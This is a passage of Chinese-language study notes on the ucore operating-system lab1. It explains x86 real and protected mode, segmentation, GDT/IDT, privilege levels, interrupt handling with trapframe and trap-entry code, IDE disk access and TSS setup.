CPU初始化控制流，保证了向下兼容</li></ul><p>例图:</p><img src="https://i.loli.net/2021/11/15/gqzhf1o9HjFSRZd.png" alt="image-20211110102048633"  /><img src="https://i.loli.net/2021/11/15/5smFgYn7Bxhq3Ke.png" alt="image-20211110101314467" style="zoom:67%;" /><h3 id="2-实模式"><a href="#2-实模式" class="headerlink" title="2.实模式"></a>2.实模式</h3><p>参考资料:《Intel 80386 Reference Programmers Manual-i386》, 基本是这个的翻译</p><p>在<strong>bootloader</strong>接手BIOS的工作后，当前的PC系统处于实模式（16位模式）运行状态，在这种状态下软件可访问的物理内存空间不能超过1MB，且无法发挥Intel 80386以上级别的32位CPU的4GB内存管理能力。</p><p>实模式将整个物理内存看成分段的区域，程序代码和数据位于不同区域，操作系统和用户程序并没有区别对待，<strong>而且每一个指针都是指向实际的物理地址</strong>。这样，用户程序的一个指针如果指向了操作系统区域或其他用户程序区域，并修改了内容，那么其后果就很可能是灾难性的。通过修改A20地址线可以完成从实模式到保护模式的转换。有关A20的进一步信息可参考“<a href="http://hengch.blog.163.com/blog/static/107800672009013104623747/">关于A20 Gate</a>”。z</p><img src="https://i.loli.net/2021/11/15/v6fC2e43WESLcaU.png" alt="img" style="zoom: 67%;" /><ul><li><strong>地址<code>0-0x9ffff</code>的640KB内存是DRAM，即插在主板上的内存条。</strong><br>顶部<code>0xf0000-0xfffff</code>的64KB内存是ROM，存放BIOS代码。</li><li>EPROM是通过地址来访问的, 80386将其映射到内存的顶端, 其他的一些外设也同样通过映射到地址空间来访问它们</li></ul><h3 id="3-分段机制-保护模式"><a href="#3-分段机制-保护模式" class="headerlink" title="3.分段机制/保护模式"></a>3.分段机制/保护模式</h3><h4 id="a-保护模式"><a href="#a-保护模式" class="headerlink" title="a.保护模式"></a>a.保护模式</h4><ul><li><p>只有在保护模式下，80386的<strong>全部32根地址线有效</strong>，可寻址高达4G字节的线性地址空间和物理地址空间，可访问64TB（有2^14^个段，每个段最大空间为2^32^字节）的逻辑地址空间，可采用分段存储管理机制和分页存储管理机制。这不仅为存储共享和保护提供了硬件支持，而且为实现虚拟存储提供了硬件支持。通过提供4个特权级和完善的特权检查机制，既能实现资源共享又能保证代码数据的安全及任务的隔离。</p><blockquote><p>【补充】保护模式下，有两个段表：GDT（Global Descriptor Table）和LDT（Local Descriptor Table），每一张段表可以包含8192 (2^13)个描述符[1]，因而最多可以同时存在2 * 2^13 = 2^14^个段。虽然保护模式下可以有这么多段，逻辑地址空间看起来很大，但实际上段并不能扩展物理地址空间，很大程度上各个段的地址空间是<strong>相互重叠</strong>的。目前所谓的64TB（2^(14+32)^=2^46^）逻辑地址空间是一个理论值，没有实际意义。在32位保护模式下，真正的物理空间仍然只有2^32字节那么大。注：在ucore lab中只用到了GDT，没有用LDT。</p><p>Reference: [1] 3.5.1 Segment Descriptor Tables, Intel® 64 and IA-32 Architectures Software Developer’s Manual</p></blockquote></li></ul><h4 id="b-分段机制"><a href="#b-分段机制" class="headerlink" title="b.分段机制"></a>b.分段机制</h4><blockquote><p>b,c,d顺序按照<strong>35</strong>年前的i386文档, 图片来自IA-32文档</p></blockquote><ul><li><p>将内存划分成以起始地址和长度限制这两个二维参数表示的内存块，这些内存块就称之为段（Segment）。编译器把源程序编译成执行程序时用到的代码段、数据段、堆和栈等概念在这里可以与段联系起来，二者在含义上是一致的</p></li><li><p>转换逻辑地址（Logical Address,应用程序员看到的地址）到物理地址（Physical Address, 实际的物理内存地址）分以下两步：</p><p>[1] 分段地址转换：<img src="https://i.loli.net/2021/11/15/2voBNa4eHCJYpDS.png" alt="image-20211110224722534" style="zoom:67%;" /></p><p>[2] 分页地址转换，这一步中把线性地址转换为物理地址。（注意：这一步是可选的，由操作系统决定是否需要。在后续试验中会涉及。</p></li></ul><h4 id="c-Segment-Selector"><a href="#c-Segment-Selector" class="headerlink" title="c.Segment Selector"></a>c.Segment Selector</h4><ul><li>A segment selector is a 16-bit identifier for a segment (see Figure 3-6). It does not point directly to the segment,<br>but instead points to the segment descriptor that defines the segment. </li></ul><img src="https://i.loli.net/2021/11/15/2pZPMgihVI6QSrR.png" alt="image-20211110233814790" style="zoom:67%;" /><h4 id="d-Segment-register"><a href="#d-Segment-register" class="headerlink" title="d.Segment register"></a>d.Segment register</h4><ul><li><p>For virtually any kind of program execution to take place, at least the code-segment (CS), data-segment (DS), and stack-segment (SS) registers must be loaded with valid segment selectors.</p></li><li><p>three additional data-segment registers (ES, FS, and GS) are optional</p><img src="https://i.loli.net/2021/11/15/JX7IuMO4QodfVFK.png" alt="image-20211110232108110" style="zoom: 67%;" /></li><li><p>For a program to access a segment, the segment selector for the segment <strong>must have been loaded in one of the</strong><br><strong>segment registers</strong>. So, although a system can define thousands of segments, <strong>only 6 can be available</strong> for immediate<br>use. </p></li><li><p><strong>shadow register(“hidden” part):</strong></p><p>When a segment selector is loaded into the visible part, the processor also loads the hidden part from the segment descriptor pointed to by the segment selector</p></li></ul><h4 id="e-Segment-Descriptor"><a href="#e-Segment-Descriptor" class="headerlink" title="e.Segment Descriptor"></a>e.Segment Descriptor</h4><blockquote><p><strong>来自IA-32文档 P2902/3-10 Vol. 3A</strong> </p></blockquote><img src="..\..\image\ucore\IxTJPGOZWVjz2BD-16373800575412.png" alt="image-20211110230124631.png" style="zoom:80%;" /><h4 id="f-Global-Descriptor-Tables"><a href="#f-Global-Descriptor-Tables" class="headerlink" title="f.Global Descriptor Tables"></a>f.Global Descriptor Tables</h4><blockquote><p><strong>(IA-32 P2906/ 3-14 Vol. 3A)</strong>:</p></blockquote><p>全局描述符表的是一个保存多个段描述符的“数组”，其起始地址保存在全局描述符表寄存器GDTR中。GDTR长48位，其中高32位为基地址，低16位为段界限。由于GDT 不能有GDT本身之内的描述符进行描述定义，所以处理器采用GDTR为GDT这一特殊的系统段。注意，全局描述符表中第一个段描述符设定为空段描述符。GDTR中的段界限以字节为单位。对于含有N个描述符的描述符表的段界限通常可设为8*N-1。</p><img src="https://i.loli.net/2021/11/15/t1iNrJbCeBzASFf.png" alt="image-20211110230336834" style="zoom:67%;" /><h4 id="g-Privilege-Level"><a href="#g-Privilege-Level" class="headerlink" title="g.Privilege Level"></a>g.Privilege Level</h4><ul><li>Current privilege level (<strong>CPL</strong>) — The CPL is the privilege level of the currently executing program or task. <u>It</u><br><u>is stored in bits 0 and 1 of the CS and SS segment registers.</u> Normally, the CPL is equal to the privilege level of<br>the code segment from which instructions are being fetched. The processor changes the CPL when program<br>control is transferred to a code segment with a different privilege level. </li></ul><blockquote><p>The CPL is treated slightly differently when accessing <strong>conforming code segments</strong>. Conforming code segments can be accessed from any privilege level that is equal to or numerically greater (less privileged) than the DPL of the conforming code segment. Also, the CPL is not changed when the processor accesses a conforming code segment that has a different privilege level than the CPL.</p></blockquote><ul><li>Descriptor privilege level (<strong>DPL</strong>) — The DPL is the privilege level of a segment or gate. It is stored in the DPL<br>field of the segment or gate descriptor for the segment or gate. </li><li>Requested privilege level (<strong>RPL</strong>) — The RPL is an override privilege level that is assigned to segment<br>selectors. It is stored in bits 0 and 1 of the segment selector. The RPL can be used to ensure that privileged code<br>does not access a segment on behalf of an application program unless the program itself has access privileges for<br>that segment. See Section 5.10.4, “Checking Caller Access Privileges (ARPL Instruction),” for a detailed description of<br>the purpose and typical use of the RPL.</li></ul><p><strong>PRIVILEGE CHECK:</strong> </p><p><img src="https://i.loli.net/2021/11/16/JGd27NnTwFDipOe.jpg" alt="img"></p><h3 id="4-中断与异常"><a href="#4-中断与异常" class="headerlink" title="4.中断与异常"></a>4.中断与异常</h3><ul><li>中断机制给操作系统提供了处理意外情况的能力，同时它也是实现进程/线程抢占式调度的一个重要基石。但中断的引入导致了对操作系统的理解更加困难。</li><li>在操作系统中，有三种特殊的中断事件。<ul><li>由CPU<em>外部设备引起的</em> 外部事件如I/O中断、时钟中断、控制台中断等是异步产生的（即产生的时刻不确定），与CPU的执行无关，我们称之为<strong>异步中断</strong>(asynchronous interrupt)也称外部中断,简称<strong>中断</strong>(interrupt)。</li><li>而把在CPU执行指令期间检测到<em>不正常的或非法</em> 的条件(如除零错、地址访问越界)所引起的内部事件称作<strong>同步中断</strong>(synchronous interrupt)，也称内部中断，简称**异常(**exception)。</li><li>把在程序中使用<em>请求系统服务</em> 的系统调用而引发的事件，称作<strong>陷入中断</strong>(trap interrupt)，也称<strong>软中断</strong>(soft interrupt)，系统调用(system call)简称<strong>trap</strong>。在后续试验中会进一步讲解系统调用。</li></ul></li></ul><img src="https://i.loli.net/2021/11/16/5HxAC9w4XSiasbK.png"  style="zoom: 60%;" /><ul><li><p><strong>Interrupt Descriptor Table</strong>:同GDT一样，IDT是一个8字节的描述符数组，但IDT的第一项可以包含一个描述符。CPU把中断（异常）号乘以8做为IDT的索引。IDT可以位于内存的任意位置，CPU通过IDT寄存器（IDTR）的内容来寻址IDT的起始地址。指令LIDT和SIDT用来操作IDTR。两条指令都有一个显示的操作数：一个6字节表示的内存地址(包含线性地址基址和界限)。</p><p>在保护模式下，最多会存在256个Interrupt/Exception Vectors。</p><p>范围[0，31]内的32个向量被异常Exception和NMI使用，但当前并非所有这32个向量都已经被使用，有几个当前没有被使用的，请不要擅自使用它们，它们被保留，以备将来可能增加新的Exception。</p><p>范围[32，255]内的向量被保留给用户定义的Interrupts。Intel没有定义，也没有保留这些Interrupts。用户可以将它们用作外部I/O设备中断（8259A IRQ），或者系统调用（System Call 、Software Interrupts）等。</p></li><li><p><strong>IDT gate descriptors</strong>: Interrupts/Exceptions应该使用Interrupt Gate和Trap Gate，它们之间的唯一区别就是：当调用Interrupt Gate时，Interrupt会被CPU自动禁止；而调用Trap Gate时，CPU则不会去禁止或打开中断，而是保留它原来的样子。</p><blockquote><p>【补充】所谓“自动禁止”，指的是CPU跳转到interrupt gate里的地址时，在将EFLAGS保存到栈上之后，清除EFLAGS里的IF位，以避免重复触发中断。在中断处理例程里，操作系统可以将EFLAGS里的IF设上,从而允许嵌套中断。但是必须在此之前做好处理嵌套中断的必要准备，如保存必要的寄存器等。二在ucore中访问Trap Gate的目的是为了实现系统调用。用户进程在正常执行中是不能禁止中断的，而当它发出系统调用后，将通过Trap Gate完成了从用户态（ring 3）的用户进程进了核心态（ring 0）的OS kernel。如果在到达OS kernel后禁止EFLAGS里的IF位，第一没意义（因为不会出现嵌套系统调用的情况），第二还会导致某些中断得不到及时响应，所以调用Trap Gate时，CPU则不会去禁止中断。总之，interrupt gate和trap gate之间没有优先级之分，仅仅是CPU在处理中断时有不同的方法，供操作系统在实现时根据需要进行选择。</p></blockquote></li><li><p>在IDT中，可以包含如下3种类型的Descriptor：</p><ul><li>Task-gate descriptor （这里没有使用）</li><li>Interrupt-gate descriptor （中断方式用到）</li><li>Trap-gate descriptor（系统调用用到）</li></ul></li></ul><img src="https://i.loli.net/2021/11/16/qbyzSN56w9eDHKX.png" alt="image-20211116161700420" style="zoom:70%;" /><p>​    Interrrupt Gate and Trap Gate 和Call Gate非常相似, 不同的Gate用3bit的Type来表示:</p><img src="https://s2.loli.net/2021/12/20/FOG4zJsyutojfen.png" alt="image-20211209164600135" style="zoom:67%;" /><h4 id="由硬件完成的工作"><a href="#由硬件完成的工作" class="headerlink" title="由硬件完成的工作"></a>由硬件完成的工作</h4><ul><li><p>硬件中断处理过程1（==起始==）：从CPU收到中断事件后，打断当前程序或任务的执行，根据某种机制跳转到中断服务例程去执行的过程。其具体流程如下：</p><ul><li>CPU在执行完当前程序的每一条指令后，都会去确认在执行刚才的指令过程中中断控制器（如：<a href="https://blog.csdn.net/longintchar/article/details/79439466">8259A</a>）是否发送中断请求过来，如果有那么CPU就会在相应的时钟脉冲到来时从总线上读取中断请求对应的中断向量；</li><li>CPU根据得到的中断向量（以此为索引）到IDT中找到该向量对应的中断描述符，中断描述符里保存着中断服务例程的段选择子；</li><li>CPU使用IDT查到的中断服务例程的段选择子从**GDT(这几个表一定要区分开来, 现在这个是指寻址的段描述符表)**中取得相应的段描述符，段描述符里保存了中断服务例程的段基址和属性信息，此时CPU就得到了中断服务例程的起始地址</li></ul><p>以上三个过程示意图: <a href='#ipc' id='ipc_r'>link</a> </p><ul><li>CPU会根据CPL和中断服务例程的段描述符的DPL信息确认是否发生了特权级的转换。比如当前程序正运行在用户态，而中断程序是运行在内核态的，则意味着发生了特权级的转换，这时CPU会从当前程序的<strong>TSS</strong>信息（该信息在内存中的起始地址存在TR寄存器中）里取得该程序的内核栈地址，即包括内核态的ss和esp的值，<strong>并立即将系统当前使用的栈切换成新的内核栈。</strong>这个栈就是即将运行的中断服务程序要使用的栈。紧接着就将当前程序使用的用户态的ss和esp压到新的内核栈中保存起来；</li><li>CPU需要开始保存当前被打断的程序的现场（即一些寄存器的值），以便于将来恢复被打断的程序继续执行。这需要利用内核栈来保存相关现场信息，即依次压入当前被打断程序使用的eflags，cs，eip，errorCode（如果是有错误码的异常）信息；</li><li>CPU利用中断服务例程的段描述符将其第一条指令的地址加载到cs和eip寄存器中，开始执行中断服务例程。这意味着先前的程序被暂停执行，中断服务程序正式开始工作。</li></ul></li></ul><hr><ul><li><p>硬件中断处理过程2（==结束==）：中断处理工作完成后需要通过iret（或iretd）指令恢复被打断的程序的执行。CPU执行IRET指令的具体过程如下：</p><ul><li>程序执行这条iret指令时，首先会从内核栈里弹出先前保存的被打断的程序的现场信息，即eflags，<code>cs</code>，eip重新开始执行；</li><li>如果存在特权级转换（<code>CS(CPL)&gt;DPL</code>），则还需要从内核栈中弹出用户态栈的ss和esp，这样也意味着栈也被切换回原先使用的用户态的栈了；</li><li>如果此次处理的是带有错误码（errorCode）的异常，CPU在恢复先前程序的现场时，并不会弹出errorCode。这一步需要通过软件完成，即要求相关的中断服务例程在调用iret返回之前添加出栈代码主动弹出errorCode。</li></ul></li></ul><p><a href='#ipc_r' id='ipc'><img src="https://i.loli.net/2021/11/16/hGLAjlTYVSWpk67.png" alt="image-20211116161700420" style="zoom:70%;" /></a></p><h4 id="特权级检查"><a href="#特权级检查" class="headerlink" title="特权级检查"></a>特权级检查</h4><ul><li><p>中断处理得==特权级转换==是通过门描述符（gate descriptor）和相关指令来完成的。一个门描述符就是一个系统类型的段描述符，一共有4个子类型：</p><ul><li>调用门描述符（call-gate descriptor may reside in the GDT or in an LDT, but not in the interrupt descriptor table (IDT)），</li><li>中断门描述符（interrupt-gate descriptor）</li><li>陷阱门描述符（trap-gate descriptor）</li><li>任务门描述符（task-gate descriptor）。</li></ul><p>Task gates are used for task switching and are discussed in Chapter 7, “Task Management”. Trap and interrupt<br>gates are special kinds of call gates used for calling exception and interrupt handlers。中断门描述符和陷阱门描述符几乎是一样的。</p><ul><li>中断发生时实施特权检查的过程如下图所示：</li></ul><img src="https://i.loli.net/2021/11/16/fqGtF4SHxWPCJhg.png" alt="这里是图片描述" style="zoom:80%;" /><ul><li>门中的DPL和段选择符一起控制着访问，同时，段选择符结合偏移量（Offset）指出了中断处理例程的入口点。内核一般在门描述符中填入内核代码段的段选择子。产生中断前后，CPU一定不会将运行控制从高特权环转向低特权环，特权级必须要么保持不变（当操作系统内核自己被中断的时候），或被提升（当用户态程序被中断的时候）。无论哪一种情况，CPL必须大于等于目的代码段的DPL。如果CPL发生了改变，一个堆栈切换操作（通过<strong>TSS</strong>完成）就会发生。如果中断是被用户态程序中的指令所触发的（比如软件执行INT n生产的中断），还会增加一个额外的检查：门的DPL必须具有与CPL相同或更低的特权。这就防止了用户代码随意触发中断。如果这些检查失败，会产生一个一般保护异常（general-protection exception）。</li></ul></li></ul><h4 id="ucore的实现流程"><a href="#ucore的实现流程" class="headerlink" title="ucore的实现流程"></a>ucore的实现流程</h4><ol><li>首先中断有几种类型<ul><li>使用int软中断, 中断号为<code>T_SWITCH_TOU</code>. 由于一开始ucore运行在内核, 所以内核到用户时会弹出栈上的ss和esp, 所以要在int指令前面加上两个push, 还要注意指令的字节长度匹配.</li><li>使用int软中断, 中断号为<code>T_SWITCH_TOK</code>. 这个时候从用户态到内核态, 要通过TR寄存器查找当前的内核栈地址, 立即切换然后压入用户态的ss和esp, 由于challenge里有说明不用返回, 所以int执行完后要释放这两个东西.</li><li>其他情况就是时钟中断和键盘中断到目前为止都是内核-&gt;内核再跳回内核, 没有什么复杂之处.</li></ul></li><li>cpu接收到中断号, 然后到IDT表里把中断号当做下标查找Interrupt Discriptor, 这个时候就找到了中断处理例程的入口地址.</li><li>cpu依次压入eflags，cs，eip, errorCode(如果是有错误码的异常), 然后加载描述符中的地址, 进入中断处理例程.</li><li>处理例程一开始就是两个pushl, 分别是errorCode和trapno), 再jmp到<code>__alltraps</code>把可能需要改变的寄存器值压到栈上<br>在栈上倒着构建一个trapframe</li><li>接下来进入处理例程, 0-31中断号由Intel保留, ucore定义的用<code>IRQ_OFFSET + IRQ_xx</code><ul><li>如果是时钟中断, inc一个全局变量tick, 没啥复杂的</li><li>如果是特权级转换, 更改一下trapframe的cs, es, ds, fs即可</li></ul></li><li>执行完毕后弹出由我们压入的寄存器值, 然后到了<code>__altraps</code>的<code>iret</code>指令,  由cpu弹出eip, cs, eflags</li><li>判断特权级转换来决定是否弹出ss, esp, <strong>中断结束</strong> </li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* registers as pushed by pushal */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pushregs</span> &#123;</span><br>    <span class="hljs-keyword">uint32_t</span> reg_edi;<br>    <span class="hljs-keyword">uint32_t</span> reg_esi;<br>    <span class="hljs-keyword">uint32_t</span> reg_ebp;<br>    <span class="hljs-keyword">uint32_t</span> reg_oesp;          <span class="hljs-comment">/* Useless */</span><br>    <span class="hljs-keyword">uint32_t</span> reg_ebx;<br>    <span class="hljs-keyword">uint32_t</span> reg_edx;<br>    <span class="hljs-keyword">uint32_t</span> reg_ecx;<br>    <span class="hljs-keyword">uint32_t</span> reg_eax;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pushregs</span> <span class="hljs-title">tf_regs</span>;</span><br>    <span class="hljs-keyword">uint16_t</span> tf_gs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding0;<br>    <span class="hljs-keyword">uint16_t</span> tf_fs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding1;<br>    <span class="hljs-keyword">uint16_t</span> tf_es;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding2;<br>    <span class="hljs-keyword">uint16_t</span> tf_ds;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding3;<br>    <span class="hljs-keyword">uint32_t</span> tf_trapno;<br>    <span class="hljs-comment">/* below here defined by x86 hardware */</span><br>    <span class="hljs-keyword">uint32_t</span> tf_err;<br>    <span class="hljs-keyword">uintptr_t</span> tf_eip;<br>    <span class="hljs-keyword">uint16_t</span> tf_cs;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding4;<br>    <span class="hljs-keyword">uint32_t</span> tf_eflags;<br>    <span class="hljs-comment">/* below here only when crossing rings, such as from user to kernel */</span><br>    <span class="hljs-keyword">uintptr_t</span> tf_esp;<br>    <span class="hljs-keyword">uint16_t</span> tf_ss;<br>    <span class="hljs-keyword">uint16_t</span> tf_padding5;<br>&#125; __attribute__((packed));<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">#----------------------------vector.S<br>.globl vector120<br>vector120:<br>  pushl $0<br>  pushl $120<br>  jmp __alltraps<br>#----------------------------trapentry.S<br>#include &lt;memlayout.h&gt;<br><br># vectors.S sends all traps here.<br>.text<br>.globl __alltraps<br>__alltraps:<br>    # push registers to build a trap frame<br>    # therefore make the stack look like a struct trapframe<br>    pushl %ds<br>    pushl %es<br>    pushl %fs<br>    pushl %gs<br>    pushal<br><br>    # load GD_KDATA into %ds and %es to set up data segments for kernel<br>    movl $GD_KDATA, %eax<br>    movw %ax, %ds<br>    movw %ax, %es<br><br>    # push %esp to pass a pointer to the trapframe as an argument to trap()<br>    pushl %esp<br><br>    # call trap(tf), where tf=%esp<br>    call trap<br><br>    # pop the pushed stack pointer<br>    popl %esp<br><br>    # return falls through to trapret...<br>.globl __trapret<br>__trapret:<br>    # restore registers from stack<br>    popal<br><br>    # restore %ds, %es, %fs and %gs<br>    popl %gs<br>    popl %fs<br>    popl %es<br>    popl %ds<br><br>    # get rid of the trap number and error code<br>    addl $0x8, %esp<br>    iret<br></code></pre></div></td></tr></table></figure><h3 id="5-地址空间"><a href="#5-地址空间" class="headerlink" title="5.地址空间"></a>5.地址空间</h3><pre><code class=" mermaid">flowchart LR    逻辑地址或虚拟地址--&gt;|分段地址转换|线性地址    线性地址--&gt;|分页地址转换|物理地址    线性地址--&gt;End</code></pre><h3 id="6-硬件访问"><a href="#6-硬件访问" class="headerlink" title="6.硬件访问"></a>6.<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_3_2_3_dist_accessing.html">硬件访问</a></h3><p>bootloader让CPU进入保护模式后，下一步的工作就是从硬盘上加载并运行OS。考虑到实现的简单性，bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。</p><p>一般主板有2个IDE通道，每个通道可以接2个IDE硬盘。访问第一个硬盘的扇区可设置IO地址寄存器0x1f0-0x1f7实现的，具体参数见下表。一般第一个IDE通道通过访问IO地址0x1f0-0x1f7来实现，第二个IDE通道通过访问0x170-0x17f实现。每个通道的主从盘的选择通过第6个IO偏移地址寄存器来设置。</p><p>表一 磁盘IO地址和对应功能</p><p>第6位：为1=LBA模式；0 = CHS模式 第7位和第5位必须为1</p><table><thead><tr><th>IO地址</th><th>功能</th></tr></thead><tbody><tr><td>0x1f0</td><td>读数据，当0x1f7不为忙状态时，可以读。</td></tr><tr><td>0x1f2</td><td>要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区</td></tr><tr><td>0x1f3</td><td>如果是LBA模式，就是LBA参数的0-7位</td></tr><tr><td>0x1f4</td><td>如果是LBA模式，就是LBA参数的8-15位</td></tr><tr><td>0x1f5</td><td>如果是LBA模式，就是LBA参数的16-23位</td></tr><tr><td>0x1f6</td><td>第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘</td></tr><tr><td>0x1f7</td><td>状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据</td></tr></tbody></table><p>当前 硬盘数据是储存到硬盘扇区中，一个扇区大小为512字节。读一个扇区的流程（可参看boot/bootmain.c中的readsect函数实现）大致如下：</p><ol><li>等待磁盘准备好</li><li>发出读取扇区的命令</li><li>等待磁盘准备好</li><li>把磁盘扇区数据读到指定内存</li></ol><h3 id="附-TSS"><a href="#附-TSS" class="headerlink" title="附: TSS"></a>附: TSS</h3><p>在<code>kern_init()-&gt;pmm_init()-&gt;gdt_init()</code>中初始化, TSS中的内核栈地址就在这里设置</p><p>TSS可以在内存的任意位置, 而ucore的taskstate定义在pmm.c中, 通过构造<em>门描述符</em> , 弄到<code>struct segdesc gdt[]</code>里面,<br>然后使用lgdt指令加载到GDT中, <strong>内核栈(8KB)从<code>c0120000 bootstack</code>到<code>c0122000 bootstacktop</code></strong>, 在entry.S中找到的, kernel.sym可看地址</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">...详见Lab2<br><span class="hljs-comment">// Since we are using bootloader&#x27;s GDT,</span><br>  <span class="hljs-comment">// we should reload gdt (second time, the last time) to get user segments and the TSS</span><br>  <span class="hljs-comment">// map virtual_addr 0 ~ 4G = linear_addr 0 ~ 4G</span><br>  <span class="hljs-comment">// then set kernel stack (ss:esp) in TSS, setup TSS in gdt, load TSS</span><br>  gdt_init();<br>  ...<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEG_TSS     5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GD_TSS      ((SEG_TSS) &lt;&lt; 3)        <span class="hljs-comment">// task segment selector</span></span><br><span class="hljs-comment">/* gdt_init - initialize the default GDT and TSS */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">gdt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// set boot kernel stack and default SS0</span><br>    load_esp0((<span class="hljs-keyword">uintptr_t</span>)bootstacktop);<br>    ts.ts_ss0 = KERNEL_DS;<br><br>    <span class="hljs-comment">// initialize the TSS filed of the gdt</span><br>    gdt[SEG_TSS] = SEGTSS(STS_T32A, (<span class="hljs-keyword">uintptr_t</span>)&amp;ts, <span class="hljs-keyword">sizeof</span>(ts), DPL_KERNEL);<br><br>    <span class="hljs-comment">// reload all segment registers</span><br>    lgdt(&amp;gdt_pd);<br><br>    <span class="hljs-comment">// load the TSS</span><br>    ltr(GD_TSS);<br>&#125;<br></code></pre></div></td></tr></table></figure><img src="../../image/ucore/image-20211221160818556.png" alt="image-20211221160818556" style="zoom: 67%;" /><img src="../../image/ucore/image-20211221161024855.png" alt="image-20211221161024855" style="zoom:67%;" /><h3 id="附2-make"><a href="#附2-make" class="headerlink" title="附2: make"></a>附2: make</h3><p><a href="https://www.gnu.org/software/make/manual/make.html#Special-Targets">Special Built-in Target Names</a> | <a href="https://www.gnu.org/software/make/manual/make.html#Automatic-Variables-1">Automatic Variables</a> | <a href="https://www.gnu.org/software/make/manual/make.html#Functions">Functions</a> | <a href="https://www.gnu.org/software/make/manual/make.html#Implicit-Rules">Using Implicit Rules</a>&amp;<a href="https://www.gnu.org/software/make/manual/make.html#Catalogue-of-Rules">Catalogue-of-Rules</a> | </p><ul><li>$(foreach var,list,text):  <code>foreach(var: list)</code> </li><li>$(if condition,then-part[,else-part])</li><li>$(filter pattern…,text)</li><li>$(basename names…)</li><li>The eval Function</li><li>含有<code>$(1)</code>这个的call function就不是最高一级的call</li><li><code>make --trace 2&gt;/dev/null</code> </li><li><code>=</code> vs. <code>:=</code> </li></ul><h2 id="几个练习"><a href="#几个练习" class="headerlink" title="几个练习"></a>几个练习</h2><h3 id="项目组成"><a href="#项目组成" class="headerlink" title="项目组成"></a><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_2_2_files.html">项目组成</a></h3><h3 id="练习一"><a href="#练习一" class="headerlink" title="练习一"></a>练习一</h3><blockquote><p>理解通过<a 